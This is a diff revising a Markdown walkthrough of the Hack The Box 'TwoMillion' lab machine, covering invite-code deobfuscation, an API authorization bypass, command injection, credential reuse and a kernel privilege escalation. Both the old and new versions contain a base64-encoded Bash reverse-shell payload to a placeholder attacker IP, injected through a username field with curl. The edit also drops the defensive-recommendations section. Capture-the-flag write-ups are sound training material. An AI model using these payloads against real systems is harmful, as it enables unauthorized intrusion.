@@ -1,5 +1,5 @@
 ---
-title: "Hack The Box: TwoMillion Writeup"
+title: "HTB TwoMillion Walkthrough"
 author: sh1nn
 date: 2026-02-21
 tags:
@@ -106,9 +106,9 @@ CVE-2023-0386
 Root shell
 ```
 
-The key lesson is that several individually simple weaknesses can be chained into a complete system compromise.
+In this machine, several individually simple weaknesses form a complete compromise chain.
 
-## What You Will Learn
+## Techniques Covered
 
 - How to inspect and deobfuscate client-side JavaScript.
 - How to enumerate an authenticated REST API.
@@ -218,24 +218,13 @@ function makeInviteCode() {
 }
 ```
 
-<!--
-ẢNH CẦN CHÈN:
-- Nội dung: JavaScript sau khi deobfuscate.
-- Tên file gợi ý: 04-deobfuscated-javascript.png
-- Định dạng đang dùng: HTML để giới hạn chiều rộng.
--->
-
-<img src="/images/twomillion/04-deobfuscated-javascript.png"
-     alt="Deobfuscated invite API JavaScript"
-     width="760">
-
 The second function reveals the following endpoint:
 
 ```http
 POST /api/v1/invite/how/to/generate
 ```
 
-Client-side code is always visible to the user. Obfuscation may reduce readability, but it does not protect API routes or application logic.
+Although the script is obfuscated, the underlying API routes and workflow remain recoverable from the client-side code.
 
 ### 2.2 Requesting invite-generation instructions
 
@@ -255,6 +244,13 @@ curl -sX POST \
 ![Invite-generation instructions returned by the API](/images/twomillion/how-to-generate.png)
 
 The response contains a ROT13-encoded message. It can be decoded locally:
+
+```bash
+curl -sX POST \
+  http://2million.htb/api/v1/invite/how/to/generate \
+  | jq -r '.data.data' \
+  | tr 'A-Za-z' 'N-ZA-Mn-za-m'
+```
 
 ![Decode ROT13](/images/twomillion/decode-rot13.png)
 
@@ -351,7 +347,7 @@ POST /api/v1/admin/vpn/generate
 PUT  /api/v1/admin/settings/update
 ```
 
-Publishing a complete route list makes reconnaissance easier, but endpoint secrecy is not an access-control mechanism. Every administrative route must enforce authorization independently.
+The route listing makes reconnaissance easier. In this case, the administrative routes remain reachable because the authorization check is implemented incorrectly.
 
 ### 3.3 Confirming the current role
 
@@ -498,27 +494,16 @@ nc -lvnp 4444
 Generate a Base64-encoded Bash reverse-shell payload:
 
 ```bash
-echo -n 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1' | base64 -w 0
-```
-
-Build the JSON body with `jq` to avoid malformed quoting:
-
-```bash
-PAYLOAD='<BASE64_PAYLOAD>'
-
-jq -n \
-  --arg username "test;echo $PAYLOAD | base64 -d | bash;" \
-  '{username: $username}' > body.json
+echo 'bash -i >& /dev/tcp/<YOUR_IP_ADDRESS>/4444 0>&1' | base64 | tr -d '\n'
 ```
 
 Send the request:
 
 ```bash
-curl -sX POST \
-  http://2million.htb/api/v1/admin/vpn/generate \
-  --cookie 'PHPSESSID=<SESSION_ID>' \
-  -H 'Content-Type: application/json' \
-  --data @body.json
+curl -s -X POST http://2million.htb/api/v1/admin/vpn/generate \
+--cookie "<PHPSESSID>" \
+-H "Content-Type: application/json" \
+--data '{"username":"test;echo <BASE64_PAYLOAD> | base64 -d | bash;"}'
 ```
 
 <!--
@@ -563,7 +548,7 @@ DB_PASSWORD=SuperDuperPass123
 Check whether a local operating-system account named `admin` exists:
 
 ```bash
-getent passwd admin
+cat /etc/passwd | grep admin
 ```
 
 Result:
@@ -596,7 +581,7 @@ cat ~/user.txt
 
 ![SSH access as the admin user](/images/twomillion/14-ssh-admin.png)
 
-The main weakness is not simply that the application reads a `.env` file. The compromise becomes possible because the same credential is reused for a local operating-system account.
+The credential recovered from `.env` is also accepted by the local `admin` account, which provides the path from the web shell to SSH access.
 
 ## 7. Linux Privilege Escalation
 
@@ -723,11 +708,8 @@ cat /root/root.txt
 - Tên file gợi ý: 18-root-shell.png
 - Định dạng đang dùng: figure + figcaption để minh họa kiểu chèn ảnh có chú thích.
 -->
-<figure>
-  <img src="/images/twomillion/18-root-shell.png"
-       alt="Root shell obtained after exploiting CVE-2023-0386">
-  <figcaption>Root access confirmed after exploiting CVE-2023-0386.</figcaption>
-</figure>
+
+![Root shell obtained after exploiting CVE-2023-0386](/images/twomillion/18-root-shell.png)
 
 ## 8. Post-Exploitation Root-Cause Analysis
 
@@ -759,16 +741,14 @@ The returned value is a non-empty string:
 
 In PHP, a non-empty string is truthy. Therefore, `!$isAdmin` evaluates to `false`, and execution continues even though the JSON message says the user is not an administrator.
 
-A safer design separates authorization logic from HTTP response formatting:
+The behavior occurs because the helper returns a JSON string rather than a Boolean value. Returning a Boolean would prevent the non-empty string from bypassing the condition.
 
 ```php
 private function currentUserIsAdmin(): bool
 {
-    // Return only true or false.
+    // Return true or false.
 }
 ```
-
-The controller should reject access before parsing or processing attacker-controlled request data.
 
 ### 8.2 OS command injection
 
@@ -782,67 +762,20 @@ $output = shell_exec(
 
 If `username` contains a shell separator such as `;`, the shell interprets the remaining text as another command.
 
-The primary fix is to avoid invoking a shell:
+The injection occurs because `$username` is interpolated into a command executed by the shell. Replacing the shell call with direct file access removes shell interpretation from this code path.
 
 ```php
 $path = "/var/www/html/VPN/user/" . $safeUsername . ".ovpn";
 $output = file_get_contents($path);
 ```
 
-A strict allowlist can be added as defense in depth:
+A username allowlist would also restrict the accepted input format:
 
 ```regex
 ^[A-Za-z0-9_-]{1,32}$
 ```
 
-Input validation alone is not a substitute for removing the shell invocation.
-
-## 9. Optional Post-Root Puzzle
-
-<details>
-<summary>Decoding thank_you.json</summary>
-
-The root directory also contains `thank_you.json`:
-
-```bash
-cat /root/thank_you.json
-```
-
-The data is nested through several transformation layers:
-
-```text
-URL encoding
-      ↓
-Hex encoding
-      ↓
-Base64 encoding
-      ↓
-XOR encryption with key: HackTheBox
-```
-
-A CyberChef recipe is:
-
-```text
-URL Decode
-From Hex
-From Base64
-XOR (key: HackTheBox, UTF-8)
-```
-
-<!--
-ẢNH TÙY CHỌN:
-- Nội dung: CyberChef recipe hoặc plaintext cuối cùng.
-- Chỉ nên chèn nếu phần Post-Root được giữ lại.
-- Tên file gợi ý: 19-post-root-puzzle.png
--->
-
-![CyberChef recipe for decoding thank_you.json](/images/twomillion/19-post-root-puzzle.png)
-
-URL encoding, hexadecimal, and Base64 are reversible encodings. XOR uses a key and is an encryption operation, although repeating-key XOR is not suitable for protecting sensitive data.
-
-</details>
-
-## 10. Vulnerability Summary
+## 19. Vulnerability Summary
 
 | Stage                | Weakness                                          | Impact                                 | Classification                            |
 | -------------------- | ------------------------------------------------- | -------------------------------------- | ----------------------------------------- |
@@ -852,40 +785,37 @@ URL encoding, hexadecimal, and Base64 are reversible encodings. XOR uses a key a
 | Lateral movement     | Database credentials reused for a local account   | SSH access as `admin`                  | Credential reuse                          |
 | Privilege escalation | Vulnerable Linux kernel                           | Root access                            | CVE-2023-0386                             |
 
-## 11. Defensive Recommendations
+## 10. Notes on the Vulnerabilities
 
-### Enforce authorization at the controller boundary
+### Authorization behavior
 
-Authorization helpers should return strict Boolean values. Every administrative endpoint must reject unauthorized users before parsing request data.
+The authorization issue results from a JSON string being evaluated as a Boolean value. Because the returned string is non-empty, the condition does not behave as intended.
 
-```php
-if (!$auth->currentUserIsAdmin()) {
-    http_response_code(403);
-    exit;
-}
-```
+### Command execution path
 
-### Avoid shell execution
+The command-injection path exists because the supplied username is interpolated into a command processed by the shell. Direct file access would avoid shell interpretation in this code path.
 
-Do not use `shell_exec()`, `system()`, or `exec()` when the same operation can be implemented with native file APIs. Where process execution is unavoidable, pass arguments without invoking a shell and apply strict allowlist validation.
+### Credential reuse
 
-### Separate credentials
+Lateral movement is possible because the database credential recovered from `.env` is also valid for the local `admin` account.
 
-Use different credentials for database services, SSH accounts, and application users. Store secrets with the minimum required permissions and rotate them after exposure.
+### Kernel state
 
-### Patch the operating system
+Root access depends on the vulnerable kernel version running on the target. The local mail, operating-system release, and kernel version together point toward CVE-2023-0386.
 
-Kernel vulnerabilities can convert a limited service compromise into full system control. Apply security updates, reboot into the patched kernel, and verify the active kernel version after maintenance.
+## 11. Conclusion
 
-### Reduce unnecessary information exposure
+TwoMillion follows a clear compromise chain: the invite workflow exposes an account-registration path, the authenticated API contains a broken authorization check, and the administrative VPN endpoint is vulnerable to command injection.
 
-Avoid publishing internal route inventories and verbose production error messages. This does not replace authorization, but it reduces unnecessary reconnaissance information.
+The resulting `www-data` shell exposes credentials in the application environment. Password reuse provides SSH access as `admin`, and the vulnerable kernel finally allows privilege escalation to root.
 
-## 12. Conclusion
+The most interesting part for me was the API enumeration stage. Each change in the response revealed another requirement, including the expected content type, parameter names, and accepted data types. These responses made it possible to infer how far each request progressed through the handler.
 
-TwoMillion demonstrates how a complete compromise can emerge from several small weaknesses: exposed client-side workflow logic, broken API authorization, command injection, credential reuse, and an outdated kernel.
+## Acknowledgements
 
-The most useful testing habit from this machine is to pay attention to changing error messages. A different response can reveal required headers, parameters, data types, and whether a supposedly protected handler is still processing the request.
+Thanks to Hack The Box and everyone involved in creating TwoMillion. Working through this machine and reviewing the official material helped me better understand the full attack chain and the vulnerabilities behind it.
+
+Thanks for taking the time to read my writeup.
 
 ## References
 
